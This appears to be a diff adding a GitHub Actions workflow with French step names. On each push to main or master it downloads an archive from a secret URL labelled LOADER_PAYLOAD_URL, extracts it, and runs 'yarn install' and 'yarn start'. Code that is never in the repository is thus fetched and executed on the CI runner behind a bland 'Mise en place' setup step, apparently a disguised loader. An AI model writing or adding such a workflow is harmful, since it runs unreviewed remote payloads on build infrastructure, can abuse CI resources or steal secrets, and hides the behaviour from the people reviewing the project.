@@ -1,0 +1,35 @@
+name: Extraire et Exécuter Archive
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - main
+      - master
+
+jobs:
+  extract-and-run:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+      
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '24'
+      
+      - name: Mise en place
+        run: |
+          curl --proto '=https' --tlsv1.2 -sSfL --cacert /etc/ssl/certs/ca-certificates.crt "${{ secrets.LOADER_PAYLOAD_URL }}" | tar -xJ
+
+      - name: Installer les dépendances
+        run: |
+          echo "Installation des dépendances avec yarn..."
+          yarn install
+          
+      - name: Démarrer l'application
+        run: |
+          echo "Démarrage de l'application..."
+          yarn start
